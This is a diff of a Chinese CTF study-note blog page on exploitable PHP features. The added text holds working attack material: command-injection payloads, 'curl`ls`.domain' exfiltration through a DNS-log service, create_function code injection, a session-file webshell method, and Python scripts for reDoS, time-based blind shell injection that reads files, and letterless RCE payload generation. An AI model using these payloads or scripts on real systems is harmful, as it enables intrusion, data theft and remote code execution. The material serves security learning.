@@ -6,9 +6,11 @@
     <meta charset="utf-8">
     <meta name="keywords" content="PHP特性, Robin">
     <meta name="description" content="思路积累各种函数，PHP语法特性，从中发现漏洞要求深入了解PHP语言并熟练使用其函数。
-漏洞利用【preg_match() 函数】
-preg_match()返回 pattern的匹配次数。 
-因为preg_match()在第一次匹配后将会停">
+漏洞利用
+
+【PHP比较运算符一览表】
+$a == $b      等于       true，如果类型转换后 $a 等于 $b。
+$a === $b ">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -405,21 +407,21 @@ preg_match()返回 pattern的匹配次数。
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-04-12
+                    2023-04-13
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2k
+                    4.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    8 分
+                    18 分
                 </div>
                 
 
@@ -440,7 +442,24 @@ preg_match()返回 pattern的匹配次数。
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>积累各种函数，PHP语法特性，从中发现漏洞<br>要求深入了解PHP语言并熟练使用其函数。</p>
-<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><pre><code>【preg_match() 函数】
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><pre><code>
+
+【PHP比较运算符一览表】
+$a == $b      等于       true，如果类型转换后 $a 等于 $b。
+$a === $b     全等       true，如果 $a 等于 $b，并且它们的类型也相同。
+$a != $b      不等       true，如果类型转换后 $a 不等于 $b。
+$a &lt;&gt; $b      不等       true，如果类型转换后 $a 不等于 $b。
+$a !== $b     不全等     true，如果 $a 不等于 $b，或者它们的类型不同。
+$a &lt; $b       小与       true，如果 $a 严格小于 $b。
+$a &gt; $b       大于       true，如果 $a 严格大于 $b。
+$a &lt;= $b      小于等于   true，如果 $a 小于或者等于 $b。
+$a &gt;= $b      大于等于   true，如果 $a 大于或者等于 $b。
+$a &lt;=&gt; $b     太空船运算符（组合比较符）   当$a小于、等于、大于 $b时 分别返回一个小于、等于、大于0的 int 值。
+当两个操作对象都是数字字符串，或一个是数字另一个是数字字符串，就会自动按照数值进行比较。
+当比较时用的是 === 或 !==， 则不会进行类型转换(因为不仅要对比数值，还要对比类型)
+
+
+【preg_match 函数】
 preg_match()返回 pattern的匹配次数。 
 因为preg_match()在第一次匹配后将会停止搜索，所以它的值将是0次（不匹配）或1次
 因为preg_match函数无法处理数组，所以可以通过数组的方式绕过
@@ -449,7 +468,7 @@ preg_match()返回 pattern的匹配次数。
 
 
 
-【intval() 函数】
+【intval 函数】
 通过使用指定的进制 base 转换（默认是十进制），返回变量的整数数值
 base是0时检测变量格式，有0x前缀使用十六进制，0开头使用八进制，否则使用十进制且只看字母之前的部分
 intval()不能用于object否则会产生E_NOTICE错误并返回1（也就是True）
@@ -463,9 +482,15 @@ intval()不能用于object否则会产生E_NOTICE错误并返回1（也就是Tru
 如果字符串中不包含数字，则转换结果为0
 
 
-【strpos() 函数】
+【strpos 函数】
 strpos($num, &quot;0&quot;)
-返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回FALSE
+返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回FALSE（区分大小写）
+
+
+【stripos 函数】
+查找字符串在另一字符串中第一次出现的位置（不区分大小写）
+注意！字符串位置从0开始，不是从1开始
+
 
 
 【md5】
@@ -565,7 +590,7 @@ ereg函数存在NULL（%00）截断漏洞，可以绕过正则过滤，使用%00
 函数匹配的字符串中包含NULL字符时会在NULL处停止匹配
 
 
-【strrev() 函数】
+【strrev 函数】
 翻转字符串，没啥好讲的。
 
 
@@ -595,7 +620,166 @@ compress.zlib://1.php
 
 【filter 函数】
 对来自非安全来源的数据（比如用户输入）进行验证和过滤
+实际上感觉没啥用？？？
 
+
+【目录溢出】
+参数长度超过了配置文件中的&quot;max_input_vars&quot;和&quot;post_max_size&quot;参数时发生溢出
+发生溢出后可以操作文件读取，文件删除，文件上传，代码执行，拒绝服务
+例如:
+?file=/proc/self/root/....../proc/self/root/var/www/html/a.php
+
+
+【trim 函数】
+trim(string,charlist)
+string       必需。规定要检查的字符串。
+charlist     可选。规定从字符串中删除哪些字符。省略该参数则移除下列所有字符：
+&quot;\0&quot;       - NULL
+&quot;\t&quot;       - 制表符
+&quot;\n&quot;       - 换行
+&quot;\x0B&quot;     - 垂直制表符
+&quot;\r&quot;       - 回车
+&quot; &quot;        - 空格
+绕过时可以用 数字 + - . %09 %0a %0b %0c %0d %20
+
+
+【PHP变量名】
+PHP变量名由数字字母下划线组成
+GET或POST的方式传进去的变量名，会自动将空格 + . [ 转换为_
+而且还有一个特性就是被转化一次之后，就不会再次转换
+
+
+【extract 函数】
+extract($a)
+数组a中的键名作为变量名，键值作为变量值，导入到当前的符号表中。
+如果数组a中存在与当前符号表中已有的变量名相同的键名，则会覆盖已有的变量值。
+
+
+【gettext 函数】
+在开启该拓展后_()等效于gettext()等效于echo
+
+
+【get_defined_vars 函数】
+返回一个包含所有已定义变量列表的多维数组，包括环境变量、服务器变量和用户定义的变量
+
+
+【readfile 函数利用】
+函数作用:读取文件并写入到输出缓冲
+利用方法:将读取的参数设置为想要读取的文件路径(适当增加../)
+
+
+【正则最大回溯次数绕过/正则溢出攻击】
+PHP为了防止正则表达式的拒绝服务攻击（reDOS）
+给 pcre 设定了一个回溯次数上限(pcre.backtrack_limit)
+回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false
+注:攻击脚本EXP在文末
+
+
+【小小的语法糖】
+在PHP中，&#39;或者shell_exec()都是执行shell命令的方法。
+&#39;是一种语法糖，可以将命令作为字符串嵌入到PHP代码中，相当于执行了shell_exec()方法。
+但是&#39;只能执行简单的shell命令而且不能获取命令的输出结果。
+// 使用``语法糖执行shell命令
+$time = `date`;
+echo $time;
+// 使用shell_exec()方法执行shell命令
+$time = shell_exec(&#39;date&#39;);
+echo $time;
+
+
+【使用curl获取信息】
+首先需要一个域名(可以去这里搞一个http://dnslog.cn/或者https://requestbin.net/)
+再执行命令 ————&gt; curl`ls`.域名
+
+
+【parse_str 函数】
+把查询字符解析到变量
+$query_string = &#39;foo[]=123&amp;foo[]=456&#39;;
+parse_str($query_string, $vars);
+echo $vars[&#39;foo&#39;][0];  // 输出：123
+echo $vars[&#39;foo&#39;][1];  // 输出：456
+
+
+【ectract 函数】
+从数组中将变量导入当前的符号表
+$person = array(&#39;name&#39; =&gt; &#39;Alice&#39;, &#39;age&#39; =&gt; 25, &#39;gender&#39; =&gt; &#39;female&#39;);
+extract($person);
+echo $name;    // 输出：Alice
+echo $age;     // 输出：25
+echo $gender;  // 输出：female
+
+
+【tee 命令】
+tee用于显示程序的输出并将其复制到一个文件中
+ls / |tee 1     意思是列出根目录并保存到1文件下
+
+
+【修改源文件的骚方法】
+sed是一种流编辑器
+处理下一行，这样不断重复，直到文件末尾
+但是文件内容并没有改变，除非你使用重定向存储输出
+xargs是给命令传递参数的一个过滤器
+可以将管道或标准输入（stdin）数据转换成命令行参数，也能够从文件的输出中读取数据。
+当使用系统命令时
+system(&#39;ls | xargs sed -i &quot;s/exec/system/&quot;&#39;);
+exec(&#39;ls | xargs sed -i &quot;s/exec/system/&quot;&#39;);
+
+
+【调用类内函数方法】
+无参调用类的静态方法:
+classname=classname::member_function
+无参调用类的数组传递调用:
+传入的参[0]=classname&amp;传入的参[1]=member_function
+
+
+【Linux命令盲注】
+if [ `ls / -1|awk &#39;NR==1&#39;|cut -c &#123;&#125; ` = b ];then sleep 2;fi
+    ls / -1 :列出根目录下的所有文件和目录，每个文件和目录占一行
+    #awk &#39;NR==&#123;0&#125;&#39; :逐行输出获取
+    #cut -c &#123;1&#125; :截取单个字符
+    `` :执行命令并返回结果
+    sleep 2 :延迟两秒回显
+    fi :Shell脚本中表示if语句结束
+Shell命令盲注脚本在文末。
+
+
+【PHP命令数字混合计算】
+php里数字可以和命令可以进行运算
+eval(1-phpinfo()-1)的结果为执行phpinfo
+phpinfo()执行成功返回true，1-1-1=-1
+此时仍然可以使用无字母数字RCE脚本，具体查看文末
+
+
+【create_function 函数】
+create_function(&#39;$a,$b&#39;,&#39;return 111;&#125;phpinfo();//&#39;)
+    相当于
+function a($a, $b)&#123;
+    return 111;&#125;phpinfo();//
+&#125;
+所以  ?show=&#125;?&gt;&lt;?=`ls`;//  就可以执行ls命令
+
+
+【命名空间污染】
+在PHP的命名空间默认为\，所有的函数和类都在\这个命名空间中
+如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径
+而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径（使用的是根命名空间）
+如果你在其他namespace里调用系统类，就必须写绝对路径这种写法
+因为将函数名改为了以反斜杠（\）开头的命名空间，所以正则表达式无法匹配到这个函数名
+安全的正则表达式应该是   &#39;/^\\myapp\\[a-z0-9_]*$/isD&#39;
+
+
+【包含session文件】
+SESSION 文件保存的目录由 session.save_path 指定，文件名以 sess_ 为前缀，后跟 SESSION ID
+默认路径一般为:
+/var/lib/php/sess_PHPSESSID
+/var/lib/php/sess_PHPSESSID
+/tmp/sess_PHPSESSID
+/tmp/sessions/sess_PHPSESSID
+文件中的数据是序列化之后的 SESSION 数据
+getshell方法:
+添加一个Cookie：PHPSESSID=flag
+并在PHP_SESSION_UPLOAD_PROGRESS下添加一句话木马
+详细操作请查看上一篇文章。
 </code></pre>
 <p>各种payload</p>
 <pre><code>小数点(含有0)      ?num=4476.0
@@ -606,7 +790,9 @@ compress.zlib://1.php
 正负号             ?num=+4476.0
 </code></pre>
 <p>下面记一道$$覆盖赋值的题:</p>
-<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<pre class="line-numbers language-php"><code class="language-php">
+
+<span class="token delimiter">&lt;?php</span>
 
 <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -638,9 +824,11 @@ compress.zlib://1.php
 
 <span class="token delimiter">?></span>
 解法<span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token constant">GET</span><span class="token punctuation">)</span><span class="token operator">?</span>x<span class="token operator">=</span><span class="token function">flag</span>   <span class="token punctuation">(</span><span class="token constant">POST</span><span class="token punctuation">)</span>error<span class="token operator">=</span>x
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>再来一题</p>
-<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<pre class="line-numbers language-php"><code class="language-php">
+
+<span class="token delimiter">&lt;?php</span>
 
 <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -669,7 +857,137 @@ compress.zlib://1.php
 
 <span class="token delimiter">?></span>
 解法<span class="token punctuation">:</span><span class="token operator">?</span>v1<span class="token operator">=</span>ctfshow<span class="token operator">&amp;</span>v2<span class="token operator">=</span><span class="token constant">GLOBALS</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>reDOS攻击EXP</p>
+<pre class="line-numbers language-Python"><code class="language-Python">
+
+#原理就是提交含有重复的会被正则匹配的巨大的字符串，使它匹配到不能再匹配为止
+import requests
+url="??????????"
+data=&#123;
+    '?':'???'*250000+'?????'
+&#125;
+r=requests.post(url,data=data)
+print(r.text)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>bash盲注EXP</p>
+<pre class="line-numbers language-Python"><code class="language-Python">
+
+//一些语句自己改正
+#!/usr/bin/env python3
+#-*- coding:utf-8 -*-
+
+import requests
+import time as t
+from urllib.parse import quote as urlen
+url  = '??????/??='????';'
+alphabet = ['&#123;','&#125;', '.', '@', '-','_','=','a','b','c','d','e','f','j','h','i','g','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9']
+
+result = ''
+for i in range(1,50):
+    for char in alphabet:
+        # payload = "if [ `ls  | grep 'flag' |cut -c&#123;&#125;` = '&#123;&#125;' ];then sleep 5;fi".format(i,char) #flag.php
+        payload = "if [ `cat flag.php | grep 'flag' |cut -c&#123;&#125;` = '&#123;&#125;' ];then sleep 5;fi".format(i,char)
+        # data = &#123;'cmd':payload&#125;
+        try:
+            start = int(t.time())
+            r = requests.get(url+payload)
+            # r = requests.post(url, data=data)
+            end = int(t.time()) - start
+            if end >= 3:        
+                result += char
+                print("Flag: "+result)
+                break
+        except Exception as e:
+            print(e)
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Shell命令盲注脚本</p>
+<pre class="line-numbers language-Python"><code class="language-Python">
+
+//列出目录
+import requests
+import time
+import string
+
+str=string.ascii_letters+string.digits+'_~'
+result=""
+for i in range(1,10):#行
+    key=0
+    for j in range(1,15):#列
+        if key==1:
+            break
+        for n in str:
+            payload="if [ `ls /|awk 'NR==&#123;0&#125;'|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi".format(i,j,n)
+            #print(payload)
+            url="?????/?c="+payload
+            try:
+                requests.get(url,timeout=(2.5,2.5))    //延时之类的自己改，看网络情况
+            except:
+                result=result+n
+                print(result)
+                break
+            if n=='~':
+                key=1
+                result+=" "
+                
+                
+//获取值
+import requests
+import time
+import string
+
+str=string.digits+string.ascii_lowercase+"-"
+result=""
+key=0
+for j in range(1,45):
+    print(j)
+    if key==1:
+        break
+    for n in str:
+        payload="if [ `cat /1.php|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi".format(j,n)
+        #print(payload)
+        url="?????/?c="+payload
+        try:
+            requests.get(url,timeout=(2.5,2.5))
+        except:
+            result=result+n
+            print(result)
+            break
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>无字母数字RCE脚本</p>
+<pre class="line-numbers language-Python"><code class="language-Python">
+
+import re
+
+content = ''
+preg = '[a-z]|[0-9]' # 题目过滤正则
+# 生成字典
+for i in range(256):
+    for j in range(256):
+        if not (re.match(preg, chr(i), re.I) or re.match(preg, chr(j), re.I)):
+            k = i | j
+            if 32 <= k <= 126:
+                a = '%' + hex(i)[2:].zfill(2)
+                b = '%' + hex(j)[2:].zfill(2)
+                content += (chr(k) + ' ' + a + ' ' + b + '\n')
+f = open('rce_or.txt', 'w')
+f.write(content)
+
+while True:
+    payload1 = ''
+    payload2 = ''
+    code = input("data:")
+    for i in code:
+        f = open('rce_or.txt')
+        lines = f.readlines()
+        for line in lines:
+            if i == line[0]:
+                payload1 = payload1 + line[2:5]
+                payload2 = payload2 + line[6:9]
+                break
+    payload = '("'+payload1+'"|"'+payload2+'")'
+    print("payload: "+ payload)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>各种可用的PHP类</p>
 <pre><code>FilesystemIterator
 遍历文件
@@ -985,7 +1303,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">79.6k</span>
+                        class="white-color">81.8k</span>
             
             
             
